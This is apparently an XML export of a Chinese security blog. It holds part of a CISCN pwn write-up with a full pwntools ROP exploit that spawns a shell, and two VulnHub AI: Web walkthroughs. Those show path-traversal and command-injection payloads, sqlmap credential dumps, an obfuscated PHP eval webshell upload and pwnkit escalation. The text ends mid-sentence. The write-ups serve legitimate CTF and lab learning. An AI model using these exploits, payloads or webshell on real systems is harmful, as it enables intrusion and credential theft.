punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>至于patch的话，我首先的思路是限制 memcpy 读入为一个定值，但是死活过不掉check<br><img src="/EXP_FILE/704dfb3bbb15aeedd79bdb4d09416ffa_MD5.jpeg"><br>想想索性直接把memcpy删掉，改下puts的参数为rcx，不影响正常服务<br><img src="/EXP_FILE/703afa5a3337bdd51e4d53d2faa6db76_MD5.jpeg"><br><img src="/EXP_FILE/af47872762f6925e6788a8a4856389dc_MD5.jpeg"></p><h1 id="go-note"><a href="#go-note" class="headerlink" title="go_note"></a>go_note</h1><p>go语言静态小程序，有栈溢出。（ciscn对go情有独钟吗）</p><p>走open_syscall在bss上写binsh，然后execve_syscall即可，只是寄存器的gadget难找一些</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'Your choice > '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input note content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input note id: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input note id: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input new content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Please input note id: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>bss<span class="token operator">=</span><span class="token number">0x527000</span><span class="token operator">+</span><span class="token number">0x2000</span>rdi<span class="token operator">=</span><span class="token number">0x0000000000462946</span>rsi_rsp_0xf8_rbp<span class="token operator">=</span><span class="token number">0x0000000000462552</span>rdx<span class="token operator">=</span><span class="token number">0x000000000047a8fa</span>rax_rbp<span class="token operator">=</span><span class="token number">0x0000000000404408</span>syscall<span class="token operator">=</span><span class="token number">0x000000000040316C</span>sadd<span class="token punctuation">(</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">'b *0x000000000047F41E'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x40</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rsi_rsp_0xf8_rbp<span class="token punctuation">,</span>bss<span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xf8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdx<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>syscall<span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span>bss<span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rsi_rsp_0xf8_rbp<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xf8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdx<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rax_rbp<span class="token punctuation">,</span><span class="token number">0x3b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>syscall<span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>s<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 100"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'note'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>至于patch的话，把循环改成定值就过check了<br><img src="/EXP_FILE/e148411ef445b5c558fb60fb7ef80bb4_MD5.jpeg"></p><h1 id="staticlink"><a href="#staticlink" class="headerlink" title="staticlink"></a>staticlink</h1><p>我是懒狗，懒得看了</p>]]></content>
      
      
      <categories>
          
          <category> CTFpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赛题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Easy-AI_Web_2</title>
      <link href="/2024/06/06/Easy-AI_Web_2/"/>
      <url>/2024/06/06/Easy-AI_Web_2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>靶机地址：<a href="https://www.vulnhub.com/entry/ai-web-2,357/">AI: Web: 2 ~ VulnHub</a></p></blockquote><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><img src="/Rxi134_FILE/9c5e37455a54f557b07e1321cb8da7a3_MD5.jpeg"></p><h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><p><img src="/Rxi134_FILE/945949733b182b78582a5e5d68a3f829_MD5.jpeg"></p><p>是个登录界面<br><img src="/Rxi134_FILE/9347ffe79c10443dde93f42085eef40f_MD5.jpeg"><br>可以注册进去<br><img src="/Rxi134_FILE/b3046717c69370c5f1f12ca23806c12e_MD5.jpeg"><br>XuezhuLi FileSharing？搜索一下有目录遍历<br><img src="/Rxi134_FILE/5deba8eebc0a0719dd778dd1d100764c_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">/vul_test/FileSharing/download.php?file_name=../../../../../../../../../../../../../etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这边扫下目录，正好扫到一个download.php，直接利用</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">http://192.168.50.139/download.php?file_name=../../../../../../../../../../../../../etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/a07934496e60f968e52cd7884bb8d5c5_MD5.jpeg"><br>成功触发</p><p>但是不能读取&#x2F;etc&#x2F;shadow，id_rsa也不行</p><p>扫一下目录，有一个&#x2F;webadmin&#x2F;需要密码<br><img src="/Rxi134_FILE/bec81bac25c350fa5a530054d13bbe3d_MD5.jpeg"></p><p>这个服务器是Apache HTTP Server，允许使用 HTTP 身份验证，密码文件位于<code>/etc/apache2/.htpasswd</code></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">aiweb2admin:$apr1$VXqmVvDD$otU1gx4nwCgsAOA7Wi.aU/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>属于md5，john破解出hash<br><img src="/Rxi134_FILE/7419798ceec3ad0112281f72729c3a5d_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">aiweb2admin:c.ronaldo <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>登录进入&#x2F;webadmin&#x2F;<br><img src="/Rxi134_FILE/27fbb8a153d352c15422b4c420687aaf_MD5.jpeg"></p><p>放上cookie继续扫，能访问到robots.txt<br><img src="/Rxi134_FILE/f358315b7e90455658ff374606383458_MD5.jpeg"></p><p>访问&#x2F;webadmin&#x2F;H05Tpin9555&#x2F;，实现了ping功能<br><img src="/Rxi134_FILE/a39c6ceff9e50aaf13161385404d1f61_MD5.jpeg"></p><p>尝试命令执行，发现 || 可以绕过<br><img src="/Rxi134_FILE/5295f88ef31eb5b041714694407a4b41_MD5.jpeg"><br>经过尝试，过滤了<code>&amp; ; -</code></p><p>我们处于<code>/var/www/html/webadmin/H05Tpin9555</code>目录下，用户为 www-data</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#/var/www/html/webadmin/H05Tpin9555</span>index.phpstyle-main.css<span class="token comment">#/var/www/html/webadmin/S0mextras</span>index.html<span class="token comment">#/var/www/html/webadmin/</span>H05Tpin9555S0mextrasindex.htmlrobots.txt<span class="token comment">#/var/www/html/</span>cssdeleting.phpdownload.phpindex.phplogout.phpsignup.phpsrvuserpage.phpviewing.phpwebadmin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>并没有什么可用的</p><p>卡住了，查看wp，有隐藏文件，但是<code>-</code>被过滤了不能使用 ls -a</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">127.0</span>.0.1 <span class="token operator">||</span> <span class="token function">ls</span> <span class="token punctuation">..</span>/S0mextras/.*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就可以看到隐藏文件了<br><img src="/Rxi134_FILE/cd36ef267539b9b3147784a9fe5f1760_MD5.jpeg"></p><p>这是其中一个用户的账密<br><img src="/Rxi134_FILE/f5a521171b4a7f2fe287b9d4021a4eef_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">User: n0nr00tuserCred: zxowieoi4sdsadpEClDws1sf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/6e56723323db67af7d4463aad8e44647_MD5.jpeg"></p><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>先反弹到meterpreter吧</p><p>没找到好用的，frp转发下端口，ubuntu18 直接pwnkit一把嗦<br><img src="/Rxi134_FILE/d7c0404ee4304956624af50b1b47c0e8_MD5.jpeg"><br><img src="/Rxi134_FILE/fa8ba88e130e5ac0efd4dcc1b02ea409_MD5.jpeg"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过该靶机，我学习到了</p><ul><li>更加深入的理解了msf</li></ul>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Easy-AI_Web_1</title>
      <link href="/2024/06/05/Easy-AI_Web_1/"/>
      <url>/2024/06/05/Easy-AI_Web_1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>靶机地址：<a href="https://www.vulnhub.com/entry/ai-web-1,353/">AI: Web: 1 ~ VulnHub</a></p></blockquote><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>额外设置了个跳板机，更接近现实<br><img src="/Rxi134_FILE/fc8a796b7c75ecb02200f2bbf5d32d55_MD5.jpeg"></p><h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><p>扫下端口<br><img src="/Rxi134_FILE/7b75f0a6b36b30a6433a6ef27c967f90_MD5.jpeg"></p><p>访问网站页面，只有一行字<br><img src="/Rxi134_FILE/938b9d2811e2b344493418a36a37ae63_MD5.jpeg"></p><p>dirsearch扫目录只扫出个&#x2F;robots.txt</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">User-agent: *Disallow: Disallow: /m3diNf0/Disallow: /se3reTdir777/uploads/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>访问都是403，拿着 &#x2F;m3diNf0&#x2F; 和 &#x2F;se3reTdir777&#x2F; 继续扫</p><p>扫到  &#x2F;m3diNf0&#x2F;info.php，是一个phpinfo界面<br><img src="/Rxi134_FILE/e895abffb33d61ed10fb573347745eea_MD5.jpeg"><br>这时候想了一下会不会有XXE，但是libxml 2.9.4默认不解析外部实体<br><img src="/Rxi134_FILE/8b7947f4287429e7b16227d7f2fdf36f_MD5.jpeg"></p><p>扫  &#x2F;se3reTdir777&#x2F; 只有一个index.php<br><img src="/Rxi134_FILE/20223847dc332295b9557c3db09dfd12_MD5.jpeg"><br>这像是一个通过ID查询用户的系统<br><img src="/Rxi134_FILE/f450c481b54ad47b43c0c91ecfdd8de1_MD5.jpeg"></p><p>与数据库有交集，试试看有没有注入点<br><img src="/Rxi134_FILE/0cd126a50fdd43a0923edea5fbcc2f46_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">available databases [2]:[*] aiweb1[*] information_schema<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">Database: aiweb1[2 tables]+------------+| user       || systemUser |+------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">Table: user[3 entries]+----+----------+-----------+| id | lastName | firstName |+----+----------+-----------+| 1  | admin    | admin     || 2  | root     | root      || 3  | mysql    | mysql     |+----+----------+-----------++----+----------------------------------------------+-----------+| id | password                                     | userName  |+----+----------------------------------------------+-----------+| 1  | RmFrZVVzZXJQYXNzdzByZA==                     | t00r      || 2  | TXlFdmlsUGFzc19mOTA4c2RhZjlfc2FkZmFzZjBzYQ== | aiweb1pwn || 3  | TjB0VGhpczBuZUFsczA=                         | u3er      |+----+----------------------------------------------+-----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>base64解码为</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">FakeUserPassw0rdMyEvilPass_f908sdaf9_sadfasf0saN0tThis0neAls0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>我们这个用户有FILE权限<br><img src="/Rxi134_FILE/b3a8df81fe3d1eb20547bb74b882433e_MD5.jpeg"></p><p>要写马得获取绝对路径，一开始想sql shell执行SQL语句但好像没这个权限，不过前面的phpinfo界面可以直接看到绝对路径<br><img src="/Rxi134_FILE/45453dd1d872d71972c09c5a83632bbe_MD5.jpeg"></p><p>有权限写的位置只有 &#x2F;se3reTdir777&#x2F;uploads</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token string">"C:\Penetration<span class="token entity" title="\E">\E</span>xploitTools\Tools\Sqlmap\sqlmap.py"</span> <span class="token parameter variable">-r</span> <span class="token string">"C:\Users\ANONYM~1\AppData\Local\Temp<span class="token entity" title="\\">\\</span>192_168_50_137_80_20240802173240.req"</span> --file-write <span class="token string">"C:\Users\Anonymous\Desktop<span class="token entity" title="\202">\202</span>40802053947.php"</span> --file-dest <span class="token string">"/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/shell.php"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">GZ0lOZtq</span> <span class="token punctuation">&#123;</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$H2qZ4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/*Z#��h*u@!h4g126854T*/"</span><span class="token operator">.</span><span class="token variable">$H2qZ4</span><span class="token operator">.</span><span class="token string double-quoted-string">"/*Z#��h*u@!h4g126854T*/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">new</span> <span class="token class-name">GZ0lOZtq</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hh'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>蚁剑连接即可<br><img src="/Rxi134_FILE/29dd7c51e3681c1c77d3f4b07a7c9b86_MD5.jpeg"></p><p>在目录下又发现一个连接数据库的文件<br><img src="/Rxi134_FILE/b93740173bc90fc25e9f1ce48c97dbfa_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">数据库地址 localhost账密 aiweb1user:wGuDisZiTkLhuiH_z_zZQXXi数据库名称 aiweb1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>先反弹 shell 到跳板机上，我用的是frp反向代理<br><img src="/Rxi134_FILE/cb7046293b85207636403285a4e46edc_MD5.jpeg"></p><p><img src="/Rxi134_FILE/9aff13a14073a24ba411dd1cfeda2acb_MD5.jpeg"></p><p>起一个伪终端，方便回显</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/sh") '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以正常登录mysql<br><img src="/Rxi134_FILE/fde2063f2d5db55cec9646e9af77a0d8_MD5.jpeg"></p><p>进行一些信息搜集，上lineas<br><img src="/Rxi134_FILE/c5784084ac53b01ea3d8577239d190ab_MD5.jpeg"></p><p>本用户对 